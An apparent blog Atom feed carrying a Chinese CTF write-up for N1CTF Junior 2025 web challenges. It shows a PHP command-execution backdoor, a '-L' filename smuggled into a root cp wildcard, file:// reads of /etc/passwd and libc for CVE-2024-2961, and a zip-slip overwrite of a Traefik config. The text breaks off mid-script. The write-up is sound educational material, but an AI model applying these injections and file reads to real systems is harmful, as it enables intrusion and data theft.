<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>雲流のLowest World</title>
  
  
  <link href="http://c1oudfl0w0.github.io/blog/atom.xml" rel="self"/>
  
  <link href="http://c1oudfl0w0.github.io/blog/"/>
  <updated>2025-02-11T16:42:11.919Z</updated>
  <id>http://c1oudfl0w0.github.io/blog/</id>
  
  <author>
    <name>C1oudfL0w0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>N1CTF Junior 2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/02/09/N1CTF-Junior-2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/02/09/N1CTF-Junior-2025/</id>
    <published>2025-02-09T05:47:36.000Z</published>
    <updated>2025-02-11T16:42:11.919Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>比隔壁好打（</p><p><del>我要是大一就好了</del></p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250210232233018.png" alt="image-20250210232233018"></p><span id="more"></span><hr><h1 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h1><p>ctrl+u找到hint：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//# sourceURL=pen.js</span><span class="token comment">//$cmd = $_REQUEST["__2025.happy.new.year"];</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>传参<code>_[2025.happy.new.year</code></p><p>然后就能 rce</p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250209135301544.png" alt="image-20250209135301544"></p><p>先读一下 index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 真的这么简单吗</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"__2025.happy.new.year"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>backup&#x2F;keep.txt 和 primary&#x2F;keep.txt 均为空</p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250209135158525.png" alt="image-20250209135158525"></p><p>接下来要提权，总之先蚁剑以 cmdlinux 连上去，注意到 primary 文件夹有写权限</p><p>进程</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">UID</span>          PID    <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot           <span class="token number">1</span>       <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 /bin/sh <span class="token parameter variable">-c</span> /start.shroot           <span class="token number">7</span>       <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 /bin/bash /start.shroot          <span class="token number">13</span>       <span class="token number">7</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 /bin/bash /backup.shroot          <span class="token number">22</span>       <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startroot          <span class="token number">23</span>       <span class="token number">7</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 <span class="token function">sleep</span> infinitywww-data      <span class="token number">24</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data      <span class="token number">27</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:34 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">129</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">134</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">135</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">136</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">137</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">143</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">147</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startwww-data     <span class="token number">149</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">13</span>:42 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> startroot        <span class="token number">1357</span>      <span class="token number">13</span>  <span class="token number">0</span> <span class="token number">14</span>:18 ?        00:00:00 <span class="token function">sleep</span> 15s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;backup.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">cd</span> /var/www/html/primary<span class="token keyword">while</span> <span class="token builtin class-name">:</span><span class="token keyword">do</span>    <span class="token function">cp</span> <span class="token parameter variable">-P</span> * /var/www/html/backup/    <span class="token function">chmod</span> <span class="token number">755</span> <span class="token parameter variable">-R</span> /var/www/html/backup/    <span class="token function">sleep</span> 15s<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里每15秒会把 primary 下的所有文件复制到 backup</p><p><code>cp -P</code>会直接复制整个软链接而不是软链接指向的内容</p><p>尝试在文件名处进行通配符在野注入，参考：<a href="https://www.cnblogs.com/linuxsec/articles/10701392.html">https://www.cnblogs.com/linuxsec/articles/10701392.html</a></p><p>把<code>-L</code>选项注入进去实现复制软链接指向的内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">""</span><span class="token operator">></span><span class="token string">'-L'</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> /flag flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>等待15s后 backup 下出现flag</p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250210000435855.png" alt="image-20250210000435855"></p><hr><h1 id="Gavatar"><a href="#Gavatar" class="headerlink" title="Gavatar"></a>Gavatar</h1><p>白名单文件上传</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'avatar'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid file type'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者任意url</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$image</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$image</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid URL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$avatarPath</span><span class="token punctuation">,</span> <span class="token variable">$image</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试一下 file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250209152608347.png" alt="image-20250209152608347"></p><p>那么接下来要rce</p><p>测了下发现出网，那尝试写个马</p><p>获取user_id，<code>file:///var/www/db/db.json</code>读取db.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"users"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"befc3c75-5af3-4715-9450-ac69879ddd42"</span><span class="token punctuation">,</span>            <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>            <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"$2y$10$M47\/Bxtr4jlUgyEPCaYWMeOP5UdHyRVJaXySpwHr6el48U6BmsXCm"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件上传的路径有了，接下来的问题是控制后缀，这里是php8，phar寄了</p><p>考虑打CVE-2024-2961，<code>file:///proc/self/maps</code> 取 maps，<code>file:///usr/lib/x86_64-linux-gnu/libc.so.6</code>取 libc.so.6</p><p>然后跑脚本打payload</p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250209225619027.png" alt="image-20250209225619027"></p><p><img src="/blog/2025/02/09/N1CTF-Junior-2025/image-20250209183432111.png" alt="image-20250209183432111"></p><hr><h1 id="traefik"><a href="#traefik" class="headerlink" title="traefik"></a>traefik</h1><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"archive/zip"</span><span class="token string">"fmt"</span><span class="token string">"io"</span><span class="token string">"net/http"</span><span class="token string">"os"</span><span class="token string">"path/filepath"</span><span class="token string">"strings"</span><span class="token string">"github.com/gin-gonic/gin"</span><span class="token string">"github.com/google/uuid"</span><span class="token punctuation">)</span><span class="token keyword">const</span> uploadDir <span class="token operator">=</span> <span class="token string">"./uploads"</span><span class="token keyword">func</span> <span class="token function">unzipSimpleFile</span><span class="token punctuation">(</span>file <span class="token operator">*</span>zip<span class="token punctuation">.</span>File<span class="token punctuation">,</span> filePath <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span>outFile<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token keyword">defer</span> outFile<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>fileInArchive<span class="token punctuation">,</span> err <span class="token operator">:=</span> file<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token keyword">defer</span> fileInArchive<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>outFile<span class="token punctuation">,</span> fileInArchive<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">unzipFile</span><span class="token punctuation">(</span>zipPath<span class="token punctuation">,</span> destDir <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span>zipReader<span class="token punctuation">,</span> err <span class="token operator">:=</span> zip<span class="token punctuation">.</span><span class="token function">OpenReader</span><span class="token punctuation">(</span>zipPath<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token keyword">defer</span> zipReader<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> file <span class="token operator">:=</span> <span class="token keyword">range</span> zipReader<span class="token punctuation">.</span>File <span class="token punctuation">&#123;</span>filePath <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>destDir<span class="token punctuation">,</span> file<span class="token punctuation">.</span>Name<span class="token punctuation">)</span><span class="token keyword">if</span> file<span class="token punctuation">.</span><span class="token function">FileInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">IsDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">MkdirAll</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> file<span class="token punctuation">.</span><span class="token function">Mode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>err <span class="token operator">=</span> <span class="token function">unzipSimpleFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> filePath<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">randFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> uuid<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">LoadHTMLGlob</span><span class="token punctuation">(</span><span class="token string">"templates/*"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>xForwardedFor <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">GetHeader</span><span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>xForwardedFor<span class="token punctuation">,</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"only localhost can get flag"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>flag <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>flag <span class="token operator">=</span> <span class="token string">"flag&#123;testflag&#125;"</span><span class="token punctuation">&#125;</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/public/index"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> <span class="token string">"index.html"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/public/upload"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>file<span class="token punctuation">,</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">FormFile</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"File upload failed"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>randomFolder <span class="token operator">:=</span> <span class="token function">randFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>destDir <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>uploadDir<span class="token punctuation">,</span> randomFolder<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">MkdirAll</span><span class="token punctuation">(</span>destDir<span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Failed to create directory"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>zipFilePath <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>uploadDir<span class="token punctuation">,</span> randomFolder<span class="token operator">+</span><span class="token string">".zip"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">SaveUploadedFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> zipFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Failed to save uploaded file"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> err <span class="token operator">:=</span> <span class="token function">unzipFile</span><span class="token punctuation">(</span>zipFilePath<span class="token punctuation">,</span> destDir<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Failed to unzip file"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"File uploaded and extracted successfully to %s"</span><span class="token punctuation">,</span> destDir<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":8080"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>功能点就一个文件上传解压</p><br><p><a href="https://github.com/jphetphoumy/traefik-CVE-2024-45410-poc">https://github.com/jphetphoumy/traefik-CVE-2024-45410-poc</a></p><p><a href="https://github.com/traefik/traefik/security/advisories/GHSA-62c8-mh53-4cqv">https://github.com/traefik/traefik/security/advisories/GHSA-62c8-mh53-4cqv</a></p><p>traefik v3.2.3 版本对不上</p><p>dynamic.yml</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># Dynamic configuration</span><span class="token key atrule">http</span><span class="token punctuation">:</span>  <span class="token key atrule">services</span><span class="token punctuation">:</span>    <span class="token key atrule">proxy</span><span class="token punctuation">:</span>      <span class="token key atrule">loadBalancer</span><span class="token punctuation">:</span>        <span class="token key atrule">servers</span><span class="token punctuation">:</span>          <span class="token punctuation">-</span> <span class="token key atrule">url</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1:8080"</span>  <span class="token key atrule">routers</span><span class="token punctuation">:</span>    <span class="token key atrule">index</span><span class="token punctuation">:</span>      <span class="token key atrule">rule</span><span class="token punctuation">:</span> Path(`/public/index`)      <span class="token key atrule">entrypoints</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>web<span class="token punctuation">]</span>      <span class="token key atrule">service</span><span class="token punctuation">:</span> proxy    <span class="token key atrule">upload</span><span class="token punctuation">:</span>      <span class="token key atrule">rule</span><span class="token punctuation">:</span> Path(`/public/upload`)      <span class="token key atrule">entrypoints</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>web<span class="token punctuation">]</span>      <span class="token key atrule">service</span><span class="token punctuation">:</span> proxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测还是要从文件上传入手，利用 zipslip 实现目录穿越文件覆盖，参考：<a href="https://saucer-man.com/information_security/364.html">https://saucer-man.com/information_security/364.html</a></p><p>ai 改一个 dynamic.yml，添加 &#x2F;flag 路由，并且使用中间件处理发送 xff 请求头</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># Dynamic configuration</span><span class="token key atrule">http</span><span class="token punctuation">:</span>  <span class="token key atrule">services</span><span class="token punctuation">:</span>    <span class="token key atrule">proxy</span><span class="token punctuation">:</span>      <span class="token key atrule">loadBalancer</span><span class="token punctuation">:</span>        <span class="token key atrule">servers</span><span class="token punctuation">:</span>          <span class="token punctuation">-</span> <span class="token key atrule">url</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1:8080"</span>    <span class="token key atrule">routers</span><span class="token punctuation">:</span>    <span class="token key atrule">index</span><span class="token punctuation">:</span>      <span class="token key atrule">rule</span><span class="token punctuation">:</span> Path(`/public/index`)      <span class="token key atrule">entrypoints</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>web<span class="token punctuation">]</span>      <span class="token key atrule">service</span><span class="token punctuation">:</span> proxy    <span class="token key atrule">upload</span><span class="token punctuation">:</span>      <span class="token key atrule">rule</span><span class="token punctuation">:</span> Path(`/public/upload`)      <span class="token key atrule">entrypoints</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>web<span class="token punctuation">]</span>      <span class="token key atrule">service</span><span class="token punctuation">:</span> proxy    <span class="token key atrule">flag</span><span class="token punctuation">:</span>      <span class="token key atrule">rule</span><span class="token punctuation">:</span> Path(`/flag`)      <span class="token key atrule">entrypoints</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>web<span class="token punctuation">]</span>      <span class="token key atrule">service</span><span class="token punctuation">:</span> proxy      <span class="token key atrule">middlewares</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> add<span class="token punctuation">-</span>header  <span class="token key atrule">middlewares</span><span class="token punctuation">:</span>    <span class="token key atrule">add-header</span><span class="token punctuation">:</span>      <span class="token key atrule">headers</span><span class="token punctuation">:</span>        <span class="token key atrule">customRequestHeaders</span><span class="token punctuation">:</span>          <span class="token key atrule">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token string">"127.0.0.1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成压缩包</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token comment"># the name of the zip file to generate</span>zf <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'out.zip'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token 